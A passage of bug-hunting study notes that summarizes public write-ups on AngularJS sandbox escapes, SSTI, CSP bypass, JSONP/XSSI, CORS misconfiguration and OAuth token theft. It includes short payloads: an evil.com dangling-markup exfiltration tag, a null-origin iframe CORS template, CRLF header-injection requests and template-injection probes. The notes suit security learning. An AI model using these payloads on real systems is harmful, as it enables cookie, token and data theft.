# specific-topics

Some specific topics about bug hunting.

- AngularJS
- SSTI
- CSP
- JSONP
  - XSSI
- CORS
- OAuth
- JSON Web Token
- S3 Bucket

### AngularJS

- [XSS without HTML: Client-Side Template Injection with AngularJS](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs) by Gareth Heyes
  - The author ananlysed AngularJS in details (what it is, the sandbox and the sanitizer), there is also some source code to help the reader understand this writeup. 
  - There is a list of sandbox bypasses payloads.
- [DOM based AngularJS sandbox escapes](https://portswigger.net/blog/dom-based-angularjs-sandbox-escapes) by Gareth Heyes
  - There is a list of DOM based Angular sandbox escapes payloads.
- [Adapting AngularJS payloads to exploit real world applications](https://portswigger.net/blog/adapting-angularjs-payloads-to-exploit-real-world-applications) by Gareth Heyes
  - Getting round the restriction (convert input to lower case) by using unicode escapes.
  - Bypassing no quotes or constructor allowed restrictions.
- [Walkthrough for Angular Expression Injection Challenge](https://ryhanson.com/angular-expression-injection-walkthrough/) by Ryan
  - This writeup is about how to break a web app (the instance used in this writeup is not available now).
  - The 'Most recent todo' didn't update after recieving the response tells us it requires a page refresh to load. This is a sign that part of the page is rendered on the server or not bound to an angular object. This may be a sign that we can inject an Angular Expression. (why?)
  - Web app might be using different start and end symbols for Angular expressions other than "{{" and "}}", search `.startSymbol(` in the source code could find them.
  - How to view an Angular scope in dev tools.
  - The todo list is being isolated by bearer token. When Bob (Bob is special and can view all the todos) view the injectd expression, he does end up adding a todo, but only to his own todo list. The only way we could see the todo Bob added is by changing his bearer token to our bearer token before he makes the request (which is possible).
  - CORS testing site: `https://cors-test.appspot.com/`.
  - Sites that offer request logging: `https://www.runscope.com/`, `https://www.mockable.io/`(how to use this site).
- [Exploiting Angular Expressions to Steal Session Tokens on Plunker](https://ryhanson.com/stealing-session-tokens-on-plunker-with-an-angular-expression-injection/) by Ryan
  - Mixing server side templates with client side templates opens up the opportunity for user input to get into a server-side view, that is then sent client side, and then evaluated by AngularJS.
  - The web app source code starts by setting `ng-app` on the html tag tells us that everything within the HTML tags will usually be within an Angular scope and evaluated by Angular. So if we can get an expression in the HTML sent from the server, chances are it will execute.
  - How to see the difference between what is sent from the server and what is created by the client: for the server response just "Right-Click -> View Page Source"; for the source that is evaluated/created by the client, look at the Elements tab in Chrome Dev Tools.
  - Some fixed suggestions.
- [Stored XSS in New Relic via Angular Expression Sandbox Escape](https://ryhanson.com/stored-xss-in-new-relic-via-angular-expression-sandbox-escape/) by Ryan
  - The admin of an account was able to set the Name of the Account to an Angular expression.
- [Reflected XSS through AngularJS sandbox bypass causes password exposure of McDonald users](https://finnwea.com/blog/stealing-passwords-from-mcdonalds-users/) by Tijme Gommers
  - Find the AngularJS version by executing `angular.verion` in the "Console" in Chrome debug tool.
  - The difference between "Remember me" and "Remember the password" (the author found code decrypting passwords on clint side) when signing in.
  - The payload in this writeup is worth to study and explore.
- [Hostinger bug bounty: Reflected XSS via angularJS template injection](https://blog.ibrahimdraidia.com/xss-via-angularjs-template-injection_hostinger/) by Taha Ibrahim DRAIDIA
  - Just find the AngularJS version by executing `angular.verion` in the "Console" in Chrome debug tool, then apply the known payload.
- [Angular 1.6 - Expression Sandbox Removal](https://blog.angularjs.org/2016/09/angular-16-expression-sandbox-removal.html) by Pete Bacon Darwin
  - What is the expression sandbox, why added the sandbox, why removed the sandbox, what are the security implications.
- [AngularJS 1.6: Life outside the sandbox](https://www.synopsys.com/blogs/software-security/angularjs-1-6-0-sandbox/) by David Johansson
  - A seemed harmless function (orderBy) controlled by attacker could cause large damage than you think.
- [Blind XSS AngularJS Payloads](https://ardern.io/2018/12/07/angularjs-bxss/) by Lewis Ardern
  - There is a list of blind XSS AngularJS payloads.

### SSTI (Server-Side Template Injection)

- [Server-Side Template Injection](https://portswigger.net/blog/server-side-template-injection) by James Kettle
  - Template engines are widely used by web applications to present dynamic data via web pages and emails. Template injection can be used to directly attack web server's internals and often obtain Remote Code Execution (RCE).
  - Two outputs hint at a server-side vulnerability.
  - Plaintext context: the presence of XSS can be used as a cue for more thorough template injection probes.
  - Code context: user input may also be placed within a template statement, then breaking out of the template statement and injecting HTML tag after it maybe work.
  - Identify the template engine in use is sometimes as trivial as submitting invalid syntax, as template engines may identify themselves in the resulting error messages. However, this technique fails when error messages are supressed.
  - The first step after finding template injection and identifying the template engine is to read the documentation.
  - Assuming no exploits have presented themselves, the next step is to explore the environment to find out exactly what you have access to. You can expect to find both default objects provided by the template engine, and application-specific objects passed in to the template by the developer. Many template system expose a `self` or namespace object containing everything in scope, and an idiomatic way to list an object's attributes and methods.
  - At this point you should have a firm idea of the attack surface available to you and be able to proceed with traditional security audit techniques, reviewing each function for exploitable vulnerabilities.
  - Some examples use template injection to trigger arbitrary object creation, arbitrary file read / write, remote file include, information disclosure and privilege escalation vulnerabilities.
- [Yahoo! RCE via Spring Engine SSTI, Recon Pay Off](https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/) by tghawkins
  - First, the author did some subdomain discovery, using a combination online tools such as `shodan.io`, `censys.io`, `crt.sh`, `dnsdumpster.com`, and also scripts on github such as `dirsearch`, `aquatone`, `massdns`, etc.
  - The author came across `datax.yahoo.com`, he was interested in this subdomain as the root directory sould redirect to `https://datax.yahoo.com/swagger-ui.html`, a 403 error page.
  - The author ran `dirsearch` scan and found `https://datax.yahoo.com/%20/swagger-ui.html` included some API endpoints.
  - `https://datax.yahooapis.com/v2/taxonomy?active=7*7`, this displayed a "Whitelabel Error Page", but the parameter vaules were reflected within the error. The author tried some XSS payloads, but couldn't work.
  - `https://datax.yahooapis.com/v2/taxonomy?active=${7*7}`, the arithmetic expression was successfully evaluated within the response. This can usually indicates that some sort of template engine / server side evaluation is involved when processing the expression.
  - After a bit more research, the author guessed that was the "Spring Engine Template". He finally found a payload to retrieve system information from the vulnerability.
- [How I was able to list some internal information from PayPal](https://medium.com/@adrien_jeanneau/how-i-was-able-to-list-some-internal-information-from-paypal-bugbounty-ca8d217a397c) by Adrien
  - A page on domain `manager.paypal.com` was vulnerable to "Expression Language Injection" (JSTL) and the author was able to extract some internal information like internal IP, internal port, internal class and more.
  - The scope of "Paypal Bug Bounty" is quite wide (`*.paypal.com`), so the author started to do the usual reconnaissance: list subdomains, list directories, etc.
  - After some days, he finally discovered an interesting page which had several fields but no button to submit, the page seems "old" so he tried to do something.
  - "WappAlyzer" didn't give much information, the author started to study the source code if certain elements could be interesting. He noted if he put the name of the fields in GET parameters, the value would be reflected in the fields.
    - Tried a reflected XSS. PayPal has a relatively efficient WAF, and he has not managed to find a bypass.
    - Tried to inject data (`{7*7}`, `{{7*7}}`, `${7*7}`). The last payload worked. So he decided to find information about Java and how work `${param}`.
  - The JSTL implicit objects have one more feature to explore: accessing servlet and JSP properties, such as a request's protocol or server port, or the major and minor versions of the servlet API your container suppoerts. You can find out that information and much more with the `pageContext` implicit object, which gives you access to the request, response, session, and application (also known as the servlet context).
    - Useful properties for the `pageContext` implicit object: `pageContext.request`, `pageContext.response`, `pageContext.properties`, `pageContext.page`, `pageContext.servletConfig`, `pageContext.servletContext`.
    - Injected them into "Burpsuite Intruder", it was possible to extract internal information from PayPal like a SSRF.
    - With fuzzing a parameter he didn't find in documentation: `${pageContext.servletContext.docRoot}`, this "implict object" display the relative path where the compiled WAR file was hosted on server.
  - After this discovery, the author tried to use this "Expression Language Injection" for a "Remote Code Execution" vulnerability, but it was not successful.

### CSP

- [Content Security Policy Reference](https://content-security-policy.com/) by Foundeo Inc
  - A table with keywords-vulues-meaning, we can use this as a manual.
- [How to use Google’s CSP Evaluator to bypass CSP](https://blog.thomasorlita.cz/vulns/google-csp-evaluator/) by Thomas Orlita
  - "Google's CSP Evaluator" is a really powerful and simple to use tool that helps you evalate how effective these restrictions are.
  - This tool is worth to use.
- [Useless CSP](https://uselesscsp.com/) by ?
  - As the title shows, it is listing CSP flaws in many popular website.
- [Using Google Analytics for data extraction](https://labs.detectify.com/2018/01/19/google-analytics-data-extraction/) by Linus Särud
  - Bypass CSP with `Google Analytics`.
  - Use HTML injection to extract data, injecting an unclosed atrribute that sucks up portions of a page, and exfiltrates them to an external endpoint (e.g. `<img src='https://evil.com/?` eats the page until the next `'`).
  - Chrome has taken additional steps to protect against this by blocking resources whose URLs contain both `\n` and `<` characters, [refer this](https://www.chromestatus.com/feature/5735596811091968).
- [Evading CSP with DOM-based dangling markup](https://portswigger.net/blog/evading-csp-with-dom-based-dangling-markup) by Gareth Heyes
  - Dangling markup is a technique to steal the contents of the page without script by using resources such as images to send the data to a remote location that an attacker controls. It is useful when reflected XSS doesn't work or is blokced by CSP.
  - The idea is you inject some partial HTML that is in an unfinished state such as a `src` attribute of an image tag, and the rest of the markup on the page closes the attribute but also sends the data in-between to the remote server.
  - `Content-Security-Policy: default-src 'none'; base-uri 'none';`.
  - We can use `base` tag to bypass this restriction. Using the `target` attribute on he `base` tag, we can change the "window name" of every link on the page, because the "window name" is exposed cross-domain, the attacker just needs to read the `window.name` property.
  - Mitigation: you can protect against the `base` tag injection by having your own base tag before any potential jnjection, this will prevent the second base tag from being able to overwrite the target.
  - Dom-based dangling markup without the `base` tag (Don't understand?).
- [Neatly bypassing CSP - How to trick CSP in letting you run whatever you want](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa) by Wallarm
  - CSP lists and describes paths and sources, from which the browser and safely load resources. The resources may include images, frames, javascripts and more. CSP policy is commonly used to block untrusted JS and minimize the chace of a successful XSS exploit.
  - A security policy implies "prohibited unless explicitly allowed".
  - `Content-Security-Policy: default-src 'self' 'unsafe-inline';`.
  - Despite the limitations, we can still upload scenarios, create freames and put together images because `self` does not prevent working with the resources governed by Self Origin Policy (SOP) (I think the author means "Same Origin Policy"). Since CSP also applies to frames, the same policy gorverns frames that may include data, blob or files formed with srcdoc as protocols. (what this means?)
  - Most of the modern browser automatically convert files, such as text files or images, to an HTML page. The reason for this behavior is to correctly depict the content in the browser window. However, iframe is also a browser window. Thus, opening any file that needs to shown in a browser in an iframe (i.e. `favicon.ico` or `robots.txt`) will immediately convert them into HTML without any data validation as long as the content-type is right.
  - If a frame opens a site page that doesn't have a CSP header, an open frame will execute all the JS inside the page. If the page has an XSS explit, we can write a js into the frame ourselves.
  - So, all you need for an XSS exploit is to open an iframe and point it at any path that doesn't include a CSP header. It can be the standard `favicon.ico`, `robots.txt`, `sitemap.xml`, `css/js`, `jpg` or other files.
  - If the site developer was careful and any expected site response (200 - OK) includes `X-Frame-Options: Deny`, we can still try to get in. Because the second common error in using CSP is a lack of protective headers when returning web scanner errors. The simplest way to try this is to try to open a web page that doesn't exist. May resources only include `X-Frame-Options` on response with 200 code and not with 404 code.
  - If that is also accounted for, we can try causing the site to return a standard web-server "invalid request" message. The author listed many methods.

### JSONP

- [What is JSONP all about](https://stackoverflow.com/questions/2067472/what-is-jsonp-all-about/2067584) by stackoverflow
- [JSONP (JSON with Padding or JSON-P)](https://en.wikipedia.org/wiki/JSONP) by wikipedia
  - What is JOSNP, why was it created, whta problem does it solve, why would developers use it.
  - Allow browser pages to work around the same-origin policy via `script` element injection.
  - The HTML `<script>` element is allowed to execute content retrieved from foreign origins. Services replying with pure JSON data were not able to share the data across domain before the adoption of CORS (Cross-Origin Resource Sharing).
  - In the JSONP usage pattern, the URL request pointed to by the `src` attribute in the `<script>` element returns JSON data, with Javascript code (usually a function call) wrapped around it. This "wrapped payload" is then interpreted by the browser. In this way, a function that is already defined in the Javascript environment can manipulate the JSON data.
  - Including `script` tags from remote servers allows the remote servers to inject any content into a website. If the remote servers have vulnerabilities that allow Javascript injection, the page served from the original server is exposed to an increased risk.
- [Practical JSONP Injection](https://securitycafe.ro/2017/01/18/practical-jsonp-injection/) by Petre Popescu
  - The callback function is hardcoded within the response:
    - basic function call
    - object method call
  - The callback function is dynamic:
    - completely controllable from the URL (GET variable)
    - partially controllable from the URL (GET variable), but appended with a number
    - controllable from the URL (GET variable), but initially not displayed in the request
  - Make sure you define your function before including the response, otherwise an undefined function will be called and you won't get any data.
  - When seeing an API call without callback, especially if the JSON formatted data is already between parentheses, manually add the "callback" to the request. If our "callback" is added to the response, we could grab some data.
  - If we have API call `http://verysecurebank.ro/getAccountTransactions`, we might try to guess the callback variable:
    - `http://verysecurebank.ro/getAccountTransactions?callback=test`
    - `http://verysecurebank.ro/getAccountTransactions?cb=test`
    - `http://verysecurebank.ro/getAccountTransactions?jsonp=test`
    - `http://verysecurebank.ro/getAccountTransactions?jsonpcallback=test`
    - `http://verysecurebank.ro/getAccountTransactions?jcb=test`
    - `http://verysecurebank.ro/getAccountTransactions?call=test`
  - List common issues we might encounter while hunting web applications for JSONP vulnerabilities.
  - Referer check bypass - We can abuse data URI scheme in order to make the request without a HTTP Referer. Since we are dealing with code, which include quotes, double quotes and other syntax breaking character, we are going to base64 encode our payload (callback definition and script inclusion).
  - Three main HTML tags that allow us to use the data URI scheme:
    - `iframe` (in the `src` attribute)
    - `embed` (in the `src` attribute)
    - `object` (in the `data` attribute)

#### XSSI

- [Your Script in My Page: What Could Possibley Go Wrong?](https://www.owasp.org/images/f/f3/Your_Script_in_My_Page_What_Could_Possibly_Go_Wrong_-_Sebastian_Lekies%2BBen_Stock.pdf) by Sebastian Lekies and Ben Stock
  - XSSI is a class of vulnerability that we could use to leak sensitive data from dynamic Javacript files. "Same-Origin Policy" relaxed for script inclusion, included code inherits origin of including site, both work on same global scope. So if there are dynamic Javascript files containing sensitive user data, we probably could get these user data by including these Javascript files in our own website.
  - Two methods to leak data:
    - Leaking data stored in global variables.
    - Leaking data via global functions.
  - Prevent XSSI Vulnerabilities;
    - Prevent script files from being included by a third-party (for example, use secret token).
    - Separate Javascript code from sensitive data (for example, create static Javascipt files and load data dynamically at run time, the data service can be protected via the SOP).
- [Backdoor of All Flickr API Calls by XSSI](https://ngailong.wordpress.com/2017/08/11/open-door-to-all-flickr-api-calls-by-xssi/) by Ron Chan
  - The author noticed a request in the traffic: `https://api.flickr.com/services/rest?page=1&per_page=6&sample_photos_count=8&viewerNSID=67364537%40N02&method=flickr.groups.recommendations&csrf=1502485507%3Ahzg1234451c92j4i%3A285a4685e2ebc8d7a4b4555a54d77395&api_key=b0faaf195123123cf44a4a14e9dabf&format=json&hermes=1&hermesClient=1&reqId=75e70106&nojsoncallback=1`
    - Two parameters got his attention, `format` and `nojsoncallback`, because seems like we can control the response format, if somehow we can change the format from JSON to XML, or HTML, or JSONP.
    - Then we can further investigate for XSS or XSSI.
  - Changed the parameter `nojsoncallback=1` to `nojsoncallback=0`, the response: `jsonFlickrApi({"groups":{"page":1,"pages":17,"perpage":6,"total":100,"group":[{"nsid":"42097308@N00","name":"Less Is More..."......})`.
    - This was obviously an XSSI, but it seemed there was a few protection in place that prevented the XSSI attack, they were `api_key` and `csrf`.
    - The author found out the `api_key` was used universally, not bounded to any user session. Only obstacle is `csrf`.
  - The author dug deeper to see where does this `csrf` came from. He scrolled through the Burpsuite traffic and finally he saw a request, the method name of the request was just amazing: `https://api.flickr.com/services/rest?method=flickr.site.getCsrf&csrf=a&api_key=3b5d2007fe2f131c60ae514fb65221b4&format=json&hermes=1&hermesClient=1&reqId=&nojsoncallback=0a`
    - The method name was `flickr.site.getCsrf`. But how do we got a "csrf token" without a "csrf token" (take some time to understand the sentence).
    - It turned out indeed the user didn't need any "csrf token" to get a "csrf token".
  - The proc in this writeup is worth to study.
- [Yahoo — Two XSSi vulnerabilities chained to steal user information](https://medium.com/@0xHyde/yahoo-two-xssi-vulnerabilities-chained-to-steal-user-information-750-bounty-e9bc6a41a40a) by hyde
  - While intercepting requests using Burpsuite, the author came across a JSONP endpint, he immediately knew this could potentially be an XSSI vulenrability. However he noticed that this protected by a `.crumb` parameter. So he realized that if he could somehow steal the victims valid `.crumb` value, he could successfully steal information about their account.
  - The author then searched all requests he intercepted in BurpSuite for his valid `.crumb` and he quickly found it in a dynamic Javascript file located at `https://messenger.yahoo.com/embed/app.js`.
  - The author created a proc which steals tha valid `.crumb` value from the dynamic Javascript file at `https://messenger.yahoo.com/embed/app.js` and then places the valid `.crumb` in the GET parameter as seen here `https://jsapi.login.yahoo.com/w/device_users?.crumb=POR1.kRjsx.` which returns a proper response containing information about the user.
    - The proc is worth to study.

### CORS

- [The Complete Guide to CORS (In)Security](https://www.bedefended.com/papers/cors-security-guide) by  Davide Danelon
  - The Same Origin Policy (SOP) rule allows scripts running in pages that come from the same site (same origin) to access methods and properties of other scripts without particular restrictions, while preventing access to most of the methods and properties between pages from different sites (different origin).
  - The term "origin" is defined using the:
    - domain name
    - application protocol
    - TCP port
  - CORS (Cross-Origin Resource Sharing) is a mechanism that, through the configuration of additional HTTP headers, tells the browser that a request, generated by a web application running at origin "A", has the permission to access the selected resource, served on origin "B".
  - The main header involved is the `Access-Control-Allow-Origin`, this header allows the listed origin to make visitors' web browsers send cross-domain requests to the server and read the responses. By default, without the `Access-Control-Allow-Credentials` header, this request will be issued without "credentials" (cookies or HTTP Authentication data), so it cannot be used to steal private user-specific information.
  - Servers can also notify clients whether "credentials" (both Cookies and HTTP Authentication data) should be sent with requests. This is done through the `Access-Control-Allow-Credentials` header that, if set to `true` by the server, allows the browser to send authenticated requests to the target handler.
  - The specification suggests to simply define a list of allowed origins separated by a space, for example:
    - `Access-Control-Allow-Origin: https://example1.com https://example2.com`
    - However, no browser currently supports this syntax.
  - Using a wildcard to trust all subdomains is not working, for example:
    - `Access-Control-Allow-Origin: *.example1.com`
  - The only wildcard origin that is currently supported is the following:
    - `Access-Control-Allow-Origin: *`
  - Despite the wildcard being supported by the browser, it cannot be used with the credentials flag set to `true`, the following headers configuration is not supported:
    - `Access-Control-Allow-Origin: *` `Access-Control-Allow-Credentials: true`
    - When repsponsing a request with credentials, the server must specify a single domain and therefore cannot use the wildcard.
    - Put simply the use of the wildcard effectively disables the `Access-Control-Allow-Credentials` header.
  - The results of these limitations and behavious is that many CORS implementations generate the `Access-Control-Allow-Origin` header based on the user-supplied `Origin` header value.
  - When testing CORS security flaws, one must find handlers for which the CORS is enabled.
    - APIs are a good canditate since very often they have to be contacted from different origins.
    - Usually servers configure CORS headers only if they receive the request containting the `Origin` header, thus it could be easy to miss this type of vulnerabilities.
    - Otherwise, if the responses received from the server contain any `Access-Control-*` headers, but no `Origin` is declared, it is possible that the server will generate the header base on the `Origin` input.
  - After mapping the candidates' handler, it is possible to send requests with the `Origin` header set. The tester should try with different `Origin` values, such as the original domain name of `null`. In this phase it could be useful to use some scripts to automate the process.
  - Two exploitable CORS configurations with `Access-Control-Allow-Credentials: true`:
    - `Access-Control-Allow-Origin: https://attacker.com` `Access-Control-Allow-Credentials: true`
    - `Access-Control-Allow-Origin: null` `Access-Control-Allow-Credentials: true`
  - Three exploitable CORS configurations without `Access-Control-Allow-Credentials`:
    - `Access-Control-Allow-Origin: https://attacker.com`
    - `Access-Control-Allow-Origin: null`
    - `Access-Control-Allow-Origin: *`
  - The CORS specification mentions also the `null` origin. This origin is triggered for example by redirects or from local HTML files. The target application may accept the `null` origin, and this could be exploited by attackers, since any website can easily obtain the `null` origin using a sandboxed iframe.
    - `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,<script>**CORS request here**</script>'></iframe>`
  - List a series of `Origin` that can be used to bypass certain validation controls implemented to verify the validity of the `Origin` header.
- [Exploiting CORS misconfigurations for Bitcoins and bounties](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties) by James Kettle
  - Websites enable CORS by sending the following HTTP response header:
    - `Access-Control-Allow-Origin: https://example.com` `Access-Control-Allow-Credentials: true`
    - This creates a trust relationship, an XSS vulnerability on `example.com` is bad news for this site.
  - Many parts of the previous writeup refers this writeup.
- [Exploiting Misconfigured CORS](http://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/) by geekboy
  - Poorly implemented, best case for attack:
    - `Access-Control-Allow-Origin: https://attacker.com` `Access-Control-Allow-Credentials: true`
  - Poorly implemented, exploitabel:
    - `Access-Control-Allow-Origin: null` `Access-Control-Allow-Credentials: true`
  - Bad implementation but not exploitable:
    - `Access-Control-Allow-Origin: *` `Access-Control-Allow-Credentials: true`
    - `Access-Control-Allow-Origin: *`
  - When we can't exploit even if above misconfigurations are present:
    - Presence of any custom header in the request which is getting used to authenticate the user.
    - Presence of any unique / authentication / key in the request URI.
  - The poc in this writeup is worth to learn.
- [Critical Issue Opened Private Chats of Facebook Messenger Users Up to Attackers](https://www.cynet.com/wp-content/uploads/2016/12/Blog-Post-BugSec-Cynet-Facebook-Originull.pdf) by cynet
  - Facebook also allows normal "GET" requests to the chat domain. But normal "GET" requests do not come with an `Origin` header. The `Origin` header is a special header sent by the browser only with XHR (XML HTTP Request) requests.
  - When the server receives a "GET" request, it does not include the `Origin` header. In many development languages, nonexistent headers are represented by the "null" vaule. If Facebook expected to receive `null` in the `Origin` header, it would not block requests from this `Origin`.
  - Most likely, the filtering mechanism is separated from the responder mechanism, and the responder assumes that the value in the `Origin` header is allowed, because if not, the filter would already have dropped the request. This development design allows Facebook to add authorized origins by changing code in one position only.
  - In conclusion, the `null` origin passes the filter check, allowing it to pass as a normal "GET" request. The responder took the value of the `Origin` header from the request, and placed it as the value for `Access-Control-Allow-Origin` header in the response.
  - In this manner, we ascertained that were we to send a request from the page with a `null` origin, we would most likely get the `Access-Control-Allow-Origin` header in response to the `null` origin.
  - When we sent the request with the origin `null`, Facebook responded with a `null` value on `Access-Control-Allow-Origin`. This meant that if we could cause the browser to send `null` in the `origin` header, we would get a `null` value in the `Access-Control-Allow-Origin`.
  - It was also possible to use the data scheme in order to send requests with the origin `null`. When a data scheme is used, the browser sets the origin to `null` for security purposes.
  - Facebook uses a continually repeated XHR request to the server to receive newly arrived messages. The server responds only when a message arrives, or at timeout. Using this method means that there is always an XHR request waiting for a server response. When the server responds to a request, Javascript code opens a new request to the server.
  - The poc in this writeup is worth to learn. 
- [Tricky CORS Bypass in Yahoo! View](https://www.corben.io/tricky-CORS/) by Corben Leo
  - The author showed how he managed to bypass `Origin` header check.
  - The payload only worked in Safari.
- [Full Account Takeover through CORS with connection Sockets](https://medium.com/@saamux/full-account-takeover-through-cors-with-connection-sockets-179133384815) by Samuel
  - Once the whole website was mapped, the author tried to see if he could exploit a CORS type bug.
  - Response: `Access-Control-Allow-Origin: http://evilwebsite.com` `Access-Control-Allow-Credentials: true`
  - Every time the author tried to extract anything from the site, it was not possible, since connections were being made by sockets that only worked once. It is not possible to reuse the same URL, or if it was possible, but you had to wait about 10 minutes for that socket connection to die to be able to use it again, and therefore that does not make sense (if we put ourselves on the attacker's side).
  - Modifying the URI by any other value, it was possible to use the socket again as a new one.
  - The poc in this writeup is worth to learn.
- [Chaining Bugs (an XSS and a CORS misconfiguration) to Steal Yahoo Contacts](http://web.archive.org/web/20180112014611/https://www.sxcurity.pro/2018/01/11/chaining-yahoo-bugs/) by sxcurity
  - The author was browsing through various requests made to `*.yahoo.com` subdomains logged in the "Target" tab of Burpsuite. He came across the subdomain `proddata.xobni.yahoo.com` and was intrigued by the name (any thing special?).
  - There were only a few requests logged, but all to the same endpoint: `https://proddata.xobni.yahoo.com/v4/contacts`. This endpoint contained every contact you have in your "Contact Book" via a single GET request.
  - The author noticed the `origin: https://mail.yahoo.com` was being reflected back in the `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true` header.
    - He tried modifying the `origin` to many different payloads, however none were reflected back.
    - He then tried to send a different Yahoo subdomain as the `origin`, rather then the `mail.yahoo.com`, worked.
    - It accepted any `*.yahoo.com` subdomain in the `origin` and reflected it back in the `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`. This meant if he could find an XSS on `*.yahoo.com`, he could leverage it to steal contacts.
  - A few days passed and the author still hadn't found an XSS. Then he saw a tweet regarding a wontfix Copy+Paste XSS in Yahoo Mail. Things get easy.
  - The author gave a proc, that required a logged in user to copy the proc and paste it into Yahoo Mail.
- [Stealing $10,000 Yahoo Cookies!](https://blog.witcoat.com/2018/05/30/stealing-10000-yahoo-cookies/) by Bull
  - The author started to script python, so he decided to write some recon script to filter out domains to attack first out of tens of thousands of Yahoo subdomains which promises some content, since it doesn't seem feasible to visit each one of them.
  - The script outputted `https://premium.advertising.yahoo.com`. Upon visiting and taking a look at intercepted requests, the page was interacting with "api endpoints" at `https://api.advertising.yahoo.com` using "XmlHttpRequests" and "CROS".
  - In a requests to `https://api.advertising.yahoo.com/services/network/whoami`, the author saw a lot of headers he sees all day while looking into yahoo in response which kind of freaked him out. It was reflecting all his request header such as `user agent`, `Accept` and `Cookie`.
  - Aslo any parameters in GET requests were getting reflected as response headers:
    - request: `GET /services/network/whoami?Test=Try HTTP/1.1`, `Host: api.advertising.yahoo.com`
    - response: `HTTP/1.1 401 Unauthorized`, `Test: Try`
  - Also it was using "CORS" and allowed any domain:
    - request: `GET /services/network/whoami HTTP/1.1`, `Host: api.advertising.yahoo.com`, `http://www.anydomain.com`
    - response: `HTTP/1.1 401 Unauthorized`, `Access-Control-Allow-Origin: http://www.anydomain.com`, `Access-Control-Allow-Credentials: True`
    - But there was not anything to read from the page, as "CORS" allow reading content from the page and don't allow reading any of the headers.
  - But "CORS" technology can be used by server to allow browser (client) to read "response headers" by adding a "special header" (`Access-Control-Expose-Header: whateverheader`) to the "response headers". Tring to add this "special header" from GET parameter:
    - request: `GET /services/network/whoami?Access-Control-Expose-Headers=Cookie HTTP/1.1`, `Host: api.advertising.yahoo.com`
    - No header got added to the response. All these special headers both in capital and small letters were blacklisted.
  - Tried to "CRLF":
    - request: `GET /services/network/whoami?test%0d%0ame=nicely HTTP/1.1`, `Host: api.advertising.yahoo.com`
    - response: `HTTP/1.1 401 Unauthorized`, `testme: nicely`
    - Also got a blacklist sanitiser for "CRLF".
    - The author loves to have lame filters in place instead of no filters, it helps bypass other things, or sometimes chrome auditor in case of XSS.
  - Tried:
    - request: `GET /services/network/whoami?Access-Control-Expose-Header%0d%0as=Cookie`, `Host: api.advertising.yahoo.com`
    - response: `HTTP/1.1 401 Unauthorized`, `Access-Control-Expose-Headers: Cookie`
    - `Access-Control-Expose-Header%0d%0as` is not a special header, so was not filtered out by 1st blacklist filter, and the 2nd filter always sanitises blacklisted bytes `%0d%0a`.
  - The author also verified that the stolen cookies were also working for the user in "Yahoo mail" or any other service by using them in respective services / requests.
  - The author gave a poc to read "reflected cookie header" from "response header", which is worth to study.

### OAuth

- [Hacking OAuth2.0 For Fun And Profit](https://drive.google.com/file/d/1Qw3hhValdRAWNGJtLbbFYfKtaevkw4fQ/view) by Pranav Hivarekar
  - OAuth 2.0 basics:
    - authorization code grant
    - implicit grant
  - Attacks on OAuth 2.0 integrations:
    - token / code stealing - case study
    - CSRF (missing `state` param) - case study
    - token impersonation - case study
- [Oauth 2.0 redirection bypass cheat sheet](http://nbsriharsha.blogspot.com/2016/04/oauth-20-redirection-bypass-cheat-sheet.html) by nbsriharsha
  - The author gave a list of payloads used in `redirect_uri` (could try, but I don't think very useful).
- [Stealing Facebook Access Tokens with a Double Submit](https://whitton.io/articles/stealing-facebook-access-tokens-with-a-double-submit/) by Jack Whitton
  - This was an old writeup and an unusual vulnerability.
  - On the "Facebook App Center", we have links to numerous different apps. Some have a "Go to App" button, for apps embedded within Facebook, and others have "Visit Website" button, for sites which connect with Facebook.
  - The "Visit Website" button submits a POST request to `ui_server.php`, which generates an "access token" and redirects you to the site.
    - It doesn't present a permissions dialog like you would have when requesting permissions via `dialog/oauth`.
    - This is presumably because the request has to be initiated by the user (due to the presence of a "CSRF token"), and because the permissions required are listed underneath the button.
  - During testing, the author noticed that omitting the `fb_dstg` ("CSRF token") and `orig/new_perms` generates a 500 error and didn't redirect you. That was expected behaviour.
  - However, in the background, an "access token" was generated. Refreshing the app's page in the "App Center" and hovering over "Visit Website" showed that it was a link to the site, with your "access token" included.
    - `&tracks.com/?fb_source=appcenter&fb_appcenter=1#access_token=BAACXpcQtAc0BAJAZBRS85nuhcqskfz...`
  - Using this bug, we can double-submi the permissions form to gain a valid "access token". The first request is discarded, the "token" is generated in the background. The second request is sent after a specific interval, which picks up the already generated "token" and redirects the user.
  - The proc in this writeup is worth to study.
- [Stealing Facebook Messenger Login Nonces worth 15k](https://stephensclafani.com/2017/03/21/stealing-messenger-com-login-nonces/) by Stephen Sclafani
  - The `messenger.com` website provides a "nonce" based login flow to allow a user who is already logged into their "Facebook account" to login to the site without having to re-enter their password.
    - It was possible to create a URL that when loaded by a user who was logged into their "Facebook account" would redirect a "nonce" for their account to another site.
    - The "nonce" could then be used to create a `messenger.com` session for the user.
    - Since `messenger.com` session cookies are interchangeable with `facebook.com`, this gave full access to the user's "Facebook account".
  - When a user visits `messenger.com`, the Facebook endpoint `https://www.facebook.com/login/messenger_dot_com_iframe/` is loaded in an iframe:
    - `https://www.facebook.com/login/messenger_dot_com_iframe/?redirect_uri=https%3A%2F%2Fwww.messenger.com%2Flogin%2Ffb_iframe_target%2F%3Finitial_request_id%3DA8eKoiVaTWx41Azk8IEwhvY&identifier=ab66de64be75eef525f18b812e07b5d1&initial_request_id=A8eKoiVaTWx41Azk8IEwhvY`
    - The `identifier` and `initial_request_id` parameters are generated by `messenger.com` and are tied to the user's `datr` cookie.
  - If the user is logged into a "Facebook account", the endpoint redirects to `https://www.messenger.com/login/fb_iframe_target/` with a secret "nonce":
    - `https://www.messenger.com/login/fb_iframe_target/?userid=100011424732901&name=Tom+Jones&secret=hFTzdP2Q&persistent=1&initial_request_id=A8eKoiVaTWx41Azk8IEwhvY`
    - The user is then prompted if they want to continue as this Facebook user.
  - If the user chooses to continue a POST request is made tohe `https://www.messenger.com/login/nonce/` endpoint with the `nonce`:
